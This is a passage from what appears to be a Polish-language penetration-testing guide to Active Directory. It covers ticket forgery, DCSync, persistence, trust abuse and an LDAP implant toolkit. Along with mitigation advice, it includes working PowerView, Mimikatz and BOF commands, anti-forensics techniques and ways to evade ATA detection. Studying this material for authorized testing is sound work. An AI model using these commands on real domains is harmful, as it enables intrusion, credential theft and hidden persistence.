Zwykle użytkownicy łączą się z systemem przez RDP, więc tutaj masz kilka sposobów ataku na sesje RDP osób trzecich:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** zapewnia system zarządzania **lokalnym hasłem Administratora** na komputerach dołączonych do domeny, gwarantując, że jest ono **losowe**, unikalne i często **zmieniane**. Te hasła są przechowywane w Active Directory, a dostęp do nich kontrolowany przez ACL tylko dla uprawnionych użytkowników. Mając wystarczające uprawnienia do dostępu do tych haseł, możliwe jest pivotowanie na inne komputery.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Zebranie certyfikatów** ze skompromitowanej maszyny może być sposobem na eskalację uprawnień w środowisku:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

Jeśli skonfigurowane są **podatne szablony**, można je nadużyć w celu eskalacji uprawnień:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Gdy uzyskasz uprawnienia **Domain Admin** lub jeszcze lepiej **Enterprise Admin**, możesz **zrzucić** **bazę domeny**: _ntds.dit_.

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Niektóre z technik omówionych wcześniej mogą być użyte do utrzymania persistence.\
Na przykład możesz:

- Uczynić użytkowników podatnymi na [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Uczynić użytkowników podatnymi na [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Nadać użytkownikowi uprawnienia [**DCSync**](#dcsync)

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

Atak **Silver Ticket** tworzy **legitymowany Ticket Granting Service (TGS) ticket** dla konkretnej usługi używając **NTLM hash** (na przykład **hash konta komputera**). Ta metoda służy do **uzyskania uprawnień dostępu do usługi**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Atak **Golden Ticket** polega na tym, że napastnik uzyskuje dostęp do **NTLM hash konta krbtgt** w środowisku Active Directory. Konto to jest szczególne, ponieważ używane jest do podpisywania wszystkich **Ticket Granting Tickets (TGTs)**, które są niezbędne do uwierzytelniania w sieci AD.

Gdy atakujący zdobędzie ten hash, może tworzyć **TGTs** dla dowolnego konta, które wybierze (atak typu Silver ticket).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Są to bilety podobne do golden ticket, sfałszowane w sposób, który **omija popularne mechanizmy wykrywania golden tickets.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Posiadanie certyfikatów konta lub możliwość ich zamówienia** jest bardzo dobrym sposobem na utrzymanie persistence w koncie użytkownika (nawet jeśli zmieni on hasło):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Używanie certyfikatów umożliwia także utrzymanie wysokich uprawnień w domenie:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Obiekt **AdminSDHolder** w Active Directory zapewnia bezpieczeństwo **uprzywilejowanych grup** (takich jak Domain Admins i Enterprise Admins) przez stosowanie standardowego **Access Control List (ACL)** w tych grupach, aby zapobiec nieautoryzowanym zmianom. Jednak ta funkcja może być wykorzystana w ataku; jeśli atakujący zmodyfikuje ACL AdminSDHolder, nadając pełny dostęp zwykłemu użytkownikowi, użytkownik ten uzyska rozległą kontrolę nad wszystkimi uprzywilejowanymi grupami. To zabezpieczenie, mające chronić, może zatem działać odwrotnie, umożliwiając niepożądany dostęp, chyba że jest ściśle monitorowane.

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

W każdym **Domain Controller (DC)** istnieje konto **lokalnego administratora**. Uzyskując prawa administratora na takim komputerze, można wydobyć hash lokalnego Administratora używając **mimikatz**. Następnie konieczna jest modyfikacja rejestru, aby **umożliwić użycie tego hasła**, pozwalając na zdalny dostęp do konta lokalnego Administratora.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Możesz **przyznać** pewne **specjalne uprawnienia** użytkownikowi nad konkretnymi obiektami domenowymi, które pozwolą użytkownikowi **eskalować uprawnienia w przyszłości**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**Security descriptors** są używane do **przechowywania** **uprawnień**, jakie **obiekt** ma **nad** innym **obiektem**. Jeśli możesz dokonać choćby **małej zmiany** w **security descriptorze** obiektu, możesz uzyskać bardzo interesujące uprawnienia nad tym obiektem bez potrzeby bycia członkiem uprzywilejowanej grupy.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Nadużyj pomocniczej klasy `dynamicObject`, aby tworzyć krótkotrwałe konta/GPO/DNS z `entryTTL`/`msDS-Entry-Time-To-Die`; same się usuwają bez tombstonów, wymazując dowody LDAP, pozostawiając jedynie osierocone SIDy, uszkodzone referencje `gPLink` lub pamiętane odpowiedzi DNS (np. zanieczyszczenie ACE AdminSDHolder lub złośliwe `gPCFileSysPath`/AD-integrated DNS redirects).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Zmień **LSASS** w pamięci, aby ustanowić **uniwersalne hasło**, dające dostęp do wszystkich kont domeny.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Możesz stworzyć własne **SSP**, aby **przechwytywać** w **plain text** **poświadczenia** używane do dostępu do maszyny.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Rejestruje **nowy Domain Controller** w AD i używa go do **wypychania atrybutów** (SIDHistory, SPNs...) na określone obiekty **bez** pozostawiania logów dotyczących **modyfikacji**. Potrzebujesz uprawnień DA i być wewnątrz **root domain**.\
Uwaga: jeśli użyjesz błędnych danych, pojawią się dość brzydkie logi.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Wcześniej omówiliśmy jak eskalować uprawnienia, jeśli masz **wystarczające uprawnienia do odczytu haseł LAPS**. Jednak te hasła mogą być także użyte do **utrzymania persistence**.\
Sprawdź:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft traktuje **Forest** jako granicę bezpieczeństwa. Oznacza to, że **kompromitacja pojedynczej domeny może potencjalnie doprowadzić do kompromitacji całego Forestu**.

### Basic Information

[**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) to mechanizm bezpieczeństwa, który pozwala użytkownikowi z jednej **domeny** na dostęp do zasobów w innej **domenie**. Tworzy on powiązanie między systemami uwierzytelniania obu domen, umożliwiając płynny przepływ weryfikacji uwierzytelnienia. Gdy domeny ustanawiają trust, wymieniają i przechowują określone **klucze** na swoich **Domain Controllerach (DC)**, które są kluczowe dla integralności trustu.

W typowym scenariuszu, jeśli użytkownik chce uzyskać dostęp do usługi w **zaufanej domenie**, musi najpierw poprosić o specjalny bilet znany jako **inter-realm TGT** od DC swojej własnej domeny. Ten TGT jest szyfrowany wspólnym **kluczem**, który obie domeny uzgadniają. Użytkownik następnie przedstawia ten TGT **DC zaufanej domeny**, aby otrzymać bilet serwisowy (**TGS**). Po pomyślnej weryfikacji inter-realm TGT przez DC zaufanej domeny, wystawia ona TGS, przyznając użytkownikowi dostęp do usługi.

**Kroki**:

1. Komputer-klient w **Domain 1** rozpoczyna proces używając swojego **NTLM hash** do żądania **Ticket Granting Ticket (TGT)** od swojego **Domain Controller (DC1)**.
2. DC1 wydaje nowy TGT, jeśli klient zostanie pomyślnie uwierzytelniony.
3. Klient następnie żąda **inter-realm TGT** od DC1, który jest potrzebny do dostępu do zasobów w **Domain 2**.
4. Inter-realm TGT jest szyfrowany **trust key** współdzielonym między DC1 i DC2 jako część dwukierunkowego trustu domen.
5. Klient zabiera inter-realm TGT do **Domain 2's Domain Controller (DC2)**.
6. DC2 weryfikuje inter-realm TGT używając współdzielonego trust key i, jeśli jest prawidłowy, wydaje **Ticket Granting Service (TGS)** dla serwera w Domain 2, do którego klient chce uzyskać dostęp.
7. W końcu klient przedstawia ten TGS serwerowi, który jest zaszyfrowany hashem konta serwera, aby uzyskać dostęp do usługi w Domain 2.

### Different trusts

Ważne jest, aby zauważyć, że **trust może być jednokierunkowy lub dwukierunkowy**. W opcji dwukierunkowej obie domeny ufają sobie nawzajem, ale w relacji **jednokierunkowej** jedna z domen będzie **trusted**, a druga **trusting**. W tym ostatnim przypadku **będziesz mógł uzyskiwać dostęp do zasobów tylko wewnątrz trusting domain z trusted domain**.

Jeżeli Domain A ufa Domain B, A jest domeną trusting, a B jest trusted. Co więcej, w **Domain A** będzie to **Outbound trust**; a w **Domain B** będzie to **Inbound trust**.

**Różne relacje zaufania**

- **Parent-Child Trusts**: Typowa konfiguracja wewnątrz tego samego forest, gdzie domena potomna automatycznie ma dwukierunkowy, przechodni trust ze swoją domeną nadrzędną. Oznacza to, że żądania uwierzytelnienia mogą płynnie przepływać między rodzicem a potomkiem.
- **Cross-link Trusts**: Nazywane także "shortcut trusts", ustanawiane między domenami potomnymi, aby przyspieszyć procesy referencyjne. W złożonych forestach referencje uwierzytelnienia zwykle muszą podróżować do korzenia forest, a następnie w dół do docelowej domeny. Tworząc cross-links, skraca się tę drogę, co jest szczególnie przydatne w środowiskach geograficznie rozproszonych.
- **External Trusts**: Ustanawiane między różnymi, niespokrewnionymi domenami i są z natury nieprzechodnie. Według [dokumentacji Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), external trusts są użyteczne do uzyskiwania dostępu do zasobów w domenie poza obecnym forestem, który nie jest połączony przez forest trust. Bezpieczeństwo wzmacniane jest przez filtrowanie SID przy external trusts.
- **Tree-root Trusts**: Te trusty są automatycznie ustanawiane między domeną root forest a nowo dodanym tree root. Chociaż nie są często spotykane, tree-root trusts są istotne przy dodawaniu nowych drzew domen do forest, umożliwiając im zachowanie unikalnej nazwy domeny i zapewniając dwukierunkową przechodniość. Więcej informacji można znaleźć w [poradniku Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Ten typ trustu to dwukierunkowy, przechodni trust między dwoma forest root domains, również wymuszający filtrowanie SID w celu wzmocnienia bezpieczeństwa.
- **MIT Trusts**: Trusty te są ustanawiane z nie-Windowsowymi domenami Kerberos zgodnymi z [RFC4120](https://tools.ietf.org/html/rfc4120). MIT trusts są bardziej wyspecjalizowane i przeznaczone dla środowisk wymagających integracji z systemami Kerberos poza ekosystemem Windows.

#### Other differences in **trusting relationships**

- Relacja zaufania może być również **przechodnia** (A ufa B, B ufa C, więc A ufa C) lub **nieprzechodnia**.
- Relacja zaufania może być ustawiona jako **bidirectional trust** (obie ufają sobie) lub jako **one-way trust** (tylko jedna ufa drugiej).

### Attack Path

1. **Enumerate** relacje zaufania
2. Sprawdź czy jakikolwiek **security principal** (user/group/computer) ma **dostęp** do zasobów **drugiej domeny**, być może przez wpisy ACE lub poprzez członkostwo w grupach drugiej domeny. Szukaj **relacji między domenami** (trust został prawdopodobnie utworzony w tym celu).
1. kerberoast w tym przypadku może być kolejną opcją.
3. **Skompromituj** **kontа**, które mogą **pivotować** przez domeny.

Atakujący mogą uzyskać dostęp do zasobów w innej domenie trzema głównymi mechanizmami:

- **Local Group Membership**: Principals mogą być dodani do lokalnych grup na maszynach, takich jak grupa “Administrators” na serwerze, przyznając im znaczną kontrolę nad tą maszyną.
- **Foreign Domain Group Membership**: Principals mogą też być członkami grup w domenie obcej. Jednak skuteczność tej metody zależy od charakteru trustu i zakresu grupy.
- **Access Control Lists (ACLs)**: Principals mogą być określeni w **ACL**, szczególnie jako podmioty w **ACE** w **DACL**, dając im dostęp do określonych zasobów. Dla tych, którzy chcą zagłębić się w mechanikę ACLs, DACLs i ACEs, dokument “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” jest nieocenionym źródłem.

### Find external users/groups with permissions

Możesz sprawdzić **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`**, aby znaleźć foreign security principals w domenie. Będą to użytkownicy/grupy z **zewnętrznej domeny/forestu**.

Możesz to sprawdzić w **Bloodhound** lub używając powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Inne sposoby enumeracji zaufania domen:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Istnieją **2 zaufane klucze**, jeden dla _Child --> Parent_ i drugi dla _Parent_ --> _Child_.\
> Możesz sprawdzić, który jest używany przez bieżącą domenę za pomocą:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Zwiększ przywileje do Enterprise admin w domenie child/parent, nadużywając zaufania za pomocą SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Eksploatacja zapisywalnego Configuration NC

Kluczowe jest zrozumienie, jak można wykorzystać Configuration Naming Context (NC). Configuration NC pełni rolę centralnego repozytorium danych konfiguracyjnych w całym lesie w środowiskach Active Directory (AD). Dane te są replikowane do każdego Domain Controller (DC) w lesie, a zapisywalne DC utrzymują zapisywalną kopię Configuration NC. Aby to wykorzystać, trzeba mieć **SYSTEM privileges on a DC**, najlepiej na child DC.

**Link GPO to root DC site**

Kontener Sites w Configuration NC zawiera informacje o wszystkich lokalizacjach (sites) komputerów należących do domeny w lesie AD. Działając z uprawnieniami SYSTEM na dowolnym DC, atakujący mogą powiązać GPO z root DC sites. To działanie może potencjalnie skompromitować domenę root poprzez manipulowanie politykami stosowanymi do tych sites.

For in-depth information, one might explore research on [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

Wektor ataku obejmuje celowanie w uprzywilejowane gMSA w domenie. KDS Root key, niezbędny do obliczania haseł gMSA, jest przechowywany w Configuration NC. Mając uprawnienia SYSTEM na dowolnym DC, możliwe jest uzyskanie dostępu do KDS Root key i obliczenie haseł dla dowolnego gMSA w całym lesie.

Detailed analysis and step-by-step guidance can be found in:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Komplementarny delegated MSA attack (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Additional external research: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Ta metoda wymaga cierpliwości i oczekiwania na tworzenie nowych uprzywilejowanych obiektów AD. Mając uprawnienia SYSTEM, atakujący może zmodyfikować schemę AD (AD Schema), aby przyznać dowolnemu użytkownikowi pełną kontrolę nad wszystkimi klasami. Może to prowadzić do nieautoryzowanego dostępu i kontroli nad nowo tworzonymi obiektami AD.

Further reading is available on [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

ADCS ESC5 vulnerability umożliwia przejęcie kontroli nad obiektami Public Key Infrastructure (PKI) w celu stworzenia szablonu certyfikatu, który pozwala na uwierzytelnienie się jako dowolny użytkownik w lesie. Ponieważ obiekty PKI znajdują się w Configuration NC, skompromitowanie zapisywalnego child DC pozwala na przeprowadzenie ataków ESC5.

More details on this can be read in [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). In scenarios lacking ADCS, the attacker has the capability to set up the necessary components, as discussed in [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
W tym scenariuszu **Twoja domena jest zaufana** przez domenę zewnętrzną, co daje Ci **nieokreślone uprawnienia** względem niej. Musisz znaleźć **które principals Twojej domeny mają jaki dostęp do domeny zewnętrznej** i następnie spróbować to wykorzystać:

{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Zewnętrzna domena lasu - jednokierunkowa (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
W tym scenariuszu **twoja domena** jest **ufająca** pewnym **uprawnieniom** podmiotu z **innej domeny**.

Jednak, kiedy **domena jest zaufana** przez domenę ufającą, domena zaufana **tworzy użytkownika** o **przewidywalnej nazwie**, który jako **hasło używa hasła zaufania**. Oznacza to, że możliwe jest **uzyskanie dostępu do użytkownika z domeny ufającej, aby dostać się do domeny zaufanej** w celu jej enumeracji i próby eskalacji uprawnień:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Innym sposobem na skompromitowanie domeny zaufanej jest znalezienie [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) utworzonego w **przeciwnym kierunku** zaufania domeny (co nie jest zbyt częste).

Innym sposobem na skompromitowanie domeny zaufanej jest oczekiwanie na maszynie, do której **użytkownik z domeny zaufanej może się zalogować** poprzez **RDP**. Następnie atakujący może wstrzyknąć kod w proces sesji RDP i **uzyskać dostęp do domeny pochodzenia ofiary** stamtąd.\  
Ponadto, jeśli **ofiara zamontowała swój dysk twardy**, z procesu **sesji RDP** atakujący może zapisać **backdoors** w **folderze autostartu dysku twardego**. Ta technika nazywa się **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Domain trust abuse mitigation

### **SID Filtering:**

- Ryzyko ataków wykorzystujących atrybut SID history w forest trusts jest łagodzone przez SID Filtering, które jest domyślnie aktywowane na wszystkich inter-forest trusts. Opiera się to na założeniu, że intra-forest trusts są bezpieczne, uznając the forest, a nie the domain, za granicę bezpieczeństwa zgodnie ze stanowiskiem Microsoft.
- Jednak jest haczyk: SID filtering może zakłócać działanie aplikacji i dostęp użytkowników, co prowadzi do jego okazjonalnego wyłączenia.

### **Selective Authentication:**

- Dla inter-forest trusts, zastosowanie Selective Authentication zapewnia, że użytkownicy z obu forests nie są automatycznie uwierzytelniani. Zamiast tego wymagane są jawne uprawnienia, aby użytkownicy mogli uzyskać dostęp do domen i serwerów w domenie lub forest ufającym.
- Ważne jest, aby zauważyć, że te środki nie chronią przed wykorzystaniem zapisywalnego Configuration Naming Context (NC) ani przed atakami na trust account.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-based AD Abuse from On-Host Implants

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) re-implements bloodyAD-style LDAP primitives as x64 Beacon Object Files that run entirely inside an on-host implant (e.g., Adaptix C2). Operators compile the pack with `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, load `ldap.axs`, and then call `ldap <subcommand>` from the beacon. All traffic rides the current logon security context over LDAP (389) with signing/sealing or LDAPS (636) with auto certificate trust, so no socks proxies or disk artifacts are required.

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers` resolve short names/OU paths into full DNs and dump the corresponding objects.
- `get-object`, `get-attribute`, and `get-domaininfo` pull arbitrary attributes (including security descriptors) plus the forest/domain metadata from `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd` expose roasting candidates, delegation settings, and existing [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) descriptors directly from LDAP.
- `get-acl` and `get-writable --detailed` parse the DACL to list trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes), and inheritance, giving immediate targets for ACL privilege escalation.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### Prymitywy zapisu LDAP do eskalacji i utrwalenia

- BOF-y tworzenia obiektów (`add-user`, `add-computer`, `add-group`, `add-ou`) pozwalają operatorowi umieścić nowe principals lub konta maszyn tam, gdzie istnieją uprawnienia do OU. `add-groupmember`, `set-password`, `add-attribute` i `set-attribute` przejmują cele bezpośrednio po wykryciu uprawnień write-property.
- Polecenia skupione na ACL, takie jak `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` i `add-dcsync`, przekładają WriteDACL/WriteOwner na dowolnym obiekcie AD na reset haseł, kontrolę członkostwa w grupach lub uprawnienia do replikacji DCSync, nie pozostawiając artefaktów PowerShell/ADSI. Odpowiedniki `remove-*` usuwają wstrzyknięte ACE.

### Delegacja, roasting i nadużycia Kerberos

- `add-spn`/`set-spn` natychmiast czynią skompromitowanego użytkownika Kerberoastable; `add-asreproastable` (przełącznik UAC) oznacza go do AS-REP roasting bez dotykania hasła.
- Makra delegacji (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) modyfikują `msDS-AllowedToDelegateTo`, flagi UAC lub `msDS-AllowedToActOnBehalfOfOtherIdentity` z beacona, umożliwiając ścieżki ataku constrained/unconstrained/RBCD i eliminując potrzebę zdalnego PowerShell lub RSAT.

### Iniekcja sidHistory, przenoszenie OU i kształtowanie powierzchni ataku

- `add-sidhistory` wstrzykuje uprzywilejowane SIDy do historii SID kontrolowanego principal (zobacz [SID-History Injection](sid-history-injection.md)), zapewniając ukrytą dziedziczność dostępu całkowicie przez LDAP/LDAPS.
- `move-object` zmienia DN/OU komputerów lub użytkowników, pozwalając atakującemu przeciągnąć zasoby do OU, gdzie już istnieją delegowane prawa, przed nadużyciem `set-password`, `add-groupmember` lub `add-spn`.
- Ściśle ograniczone polecenia usuwania (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember` itp.) pozwalają na szybkie wycofanie po zebraniu poświadczeń lub ustanowieniu persistence, minimalizując telemetrię.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Some General Defenses

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **Środki obronne dotyczące ochrony poświadczeń**

- **Ograniczenia Domain Admins**: Zaleca się, aby Domain Admins logowali się jedynie do Domain Controllers, unikając korzystania z nich na innych hostach.
- **Uprawnienia kont serwisowych**: Usługi nie powinny być uruchamiane z uprawnieniami Domain Admin (DA) w celu utrzymania bezpieczeństwa.
- **Czasowe ograniczenie przywilejów**: Dla zadań wymagających uprawnień DA, ich czas trwania powinien być ograniczony. Można to zrobić za pomocą: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **Łagodzenie LDAP relay**: Audytuj Event ID 2889/3074/3075, a następnie wymuś LDAP signing oraz LDAPS channel binding na DCs/clients, aby zablokować próby LDAP MITM/relay.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### **Wdrażanie technik Deception**

- Wdrażanie deception polega na ustawianiu pułapek, takich jak konta lub komputery przynęty, z cechami typu hasła never expire lub oznaczeniem Trusted for Delegation. Szczegółowe podejście obejmuje tworzenie użytkowników z określonymi uprawnieniami lub dodawanie ich do grup o wysokich uprawnieniach.
- Praktyczny przykład używa narzędzi takich jak: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Więcej o wdrażaniu technik deception znajdziesz na [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Wykrywanie Deception**

- **Dla obiektów użytkownika**: Podejrzane wskaźniki obejmują nietypowe ObjectSID, rzadkie logowania, daty utworzenia i niskie liczby błędnych haseł.
- **Ogólne wskaźniki**: Porównywanie atrybutów potencjalnych obiektów przynęty z prawdziwymi może ujawnić niespójności. Narzędzia takie jak [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) pomagają w identyfikacji takich deceptions.

### **Omijanie systemów wykrywania**

- **Omijanie wykrywania Microsoft ATA**:
- **Enumeracja użytkowników**: Unikanie enumeracji sesji na Domain Controllers, aby zapobiec wykryciu przez ATA.
- **Impersonacja ticketów**: Użycie kluczy **aes** do tworzenia ticketów pomaga unikać detekcji przez brak degradacji do NTLM.
- **Ataki DCSync**: Wykonywanie z poza Domain Controller, aby uniknąć wykrycia przez ATA — wykonanie bezpośrednio z Domain Controller wywoła alerty.

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
